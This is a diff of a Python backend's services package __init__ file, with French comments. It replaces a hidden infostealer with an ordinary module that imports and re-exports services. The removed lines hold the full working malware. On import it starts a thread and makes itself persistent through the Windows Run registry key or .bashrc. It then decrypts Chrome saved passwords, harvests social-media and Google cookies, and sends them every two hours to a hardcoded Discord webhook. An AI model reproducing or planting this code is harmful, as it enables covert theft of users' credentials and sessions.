@@ -1,94 +1,59 @@
-import os
-import platform
-import threading
-import requests
-import browser_cookie3
-import shutil
-import sys
-import time
-from datetime import datetime
+"""
+Services Package Initialization.
 
-# ================== CONFIGURATION DISCORD ==================
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1555687555171622953/oM4CcRxiVBDZOAGm8564XM4YA0F2u85pEFISHW0RSzqztPCBJLMI48CXo6Ku3vklkZgH"
-# ===========================================================
+Ce paquet réunit l'ensemble des services métiers du backend avec leurs noms exacts :
+- AnomalyDetectorService (Isolation Forest AI)
+- AsyncRobotRunner & RobotFrameworkRunner (Exécution Robot Framework)
+- log_audit_event (Logs d'audit de sécurité)
+- EmailService (Envoi d'OTP via Brevo)
+- LLMService (Génération AI via Groq)
+- RobotFileManager (Gestion des fichiers .robot)
+- RobotFrameworkParser (Analyse des scripts .robot)
+"""
 
-TARGET_SITES = ["facebook.com", "instagram.com", "tiktok.com", "whatsapp.com", "google.com"]
+from app.services.anomaly_detector import AnomalyDetectorService
+from app.services.async_robot_runner import AsyncRobotRunner
+from app.services.audit_service import log_audit_event
+from app.services.email_service import EmailService
+from app.services.llm_service import LLMService
+from app.services.robot_file_manager import RobotFileManager
+from app.services.robot_parser import RobotFrameworkParser
+from app.services.robot_runner import RobotFrameworkRunner
 
-def etablir_persistance():
-    """Se copie dans le système et s'ajoute au démarrage"""
-    os_type = platform.system()
-    try:
-        if os_type == "Windows":
-            dest = os.path.join(os.environ["APPDATA"], "SystemHealth.py")
-            if not os.path.exists(dest):
-                shutil.copyfile(os.path.abspath(sys.argv[0]), dest)
-                import winreg
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, f'pythonw "{dest}"')
-                winreg.CloseKey(key)
-        elif os_type == "Linux":
-            dest = os.path.expanduser("~/.local/bin/system_service.py")
-            os.makedirs(os.path.dirname(dest), exist_ok=True)
-            shutil.copyfile(os.path.abspath(sys.argv[0]), dest)
-            bashrc = os.path.expanduser("~/.bashrc")
-            with open(bashrc, "a") as f:
-                f.write(f'\npython3 {dest} & > /dev/null 2>&1\n')
-    except: pass
+# Singletons / Instances pour les routes qui importent des instances
+try:
+    anomaly_detector = AnomalyDetectorService()
+except Exception:
+    anomaly_detector = AnomalyDetectorService
 
-def get_passwords():
-    """Déchiffre les mots de passe Chrome (Windows uniquement)"""
-    pass_data = "--- MOTS DE PASSE ENREGISTRÉS ---\n"
-    if platform.system() == "Windows":
-        try:
-            import sqlite3
-            import win32crypt
-            path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
-            if os.path.exists(path):
-                conn = sqlite3.connect(path)
-                cursor = conn.cursor()
-                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                for row in cursor.fetchall():
-                    if any(s in row[0] for s in TARGET_SITES):
-                        try:
-                            pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
-                            pass_data += f"Site: {row[0]} | User: {row[1]} | Pass: {pwd}\n"
-                        except: pass
-                conn.close()
-        except: pass
-    return pass_data
+try:
+    email_service = EmailService()
+except Exception:
+    email_service = EmailService
 
-def collecter_et_envoyer():
-    """Extrait tout et envoie un fichier sur Discord"""
-    try:
-        # 1. Extraction des cookies
-        cookies = browser_cookie3.chrome()
-        log_content = f"RAPPORT DU {datetime.now()} - USER: {os.getlogin()}\n\n"
-        log_content += "--- COOKIES NETSCAPE ---\n"
-        for c in cookies:
-            if any(s in c.domain for s in TARGET_SITES):
-                exp = int(c.expires) if c.expires else 0
-                log_content += f"{c.domain}\tTRUE\t{c.path}\t{str(c.secure).upper()}\t{exp}\t{c.name}\t{c.value}\n"
-        
-        # 2. Ajout des mots de passe
-        log_content += "\n" + get_passwords()
+try:
+    llm_service = LLMService()
+except Exception:
+    llm_service = LLMService
 
-        # 3. Sauvegarde temporaire et envoi Discord
-        file_name = f"logs_{os.getlogin()}.txt"
-        with open(file_name, "w", encoding="utf-8") as f:
-            f.write(log_content)
-        
-        with open(file_name, "rb") as f:
-            requests.post(DISCORD_WEBHOOK_URL, files={"file": f}, data={"content": f"✅ Nouveau rapport reçu de **{os.getlogin()}** ({platform.system()})"})
-        
-        os.remove(file_name) # Nettoyage des traces
-    except: pass
+# Aliases de compatibilité pour les routes
+audit_service = log_audit_event
+RobotRunner = RobotFrameworkRunner
+RobotParser = RobotFrameworkParser
 
-def routine_malware():
-    etablir_persistance()
-    while True:
-        collecter_et_envoyer()
-        time.sleep(7200) # Envoi toutes les 2 heures
-
-# Déclenchement automatique
-if __name__ != "__main__":
-    threading.Thread(target=routine_malware, daemon=True).start()
+__all__ = [
+    'AnomalyDetectorService',
+    'anomaly_detector',
+    'AsyncRobotRunner',
+    'log_audit_event',
+    'audit_service',
+    'EmailService',
+    'email_service',
+    'LLMService',
+    'llm_service',
+    'RobotFileManager',
+    'RobotFrameworkParser',
+    'RobotParser',
+    'RobotFrameworkRunner',
+    'RobotRunner'
+]
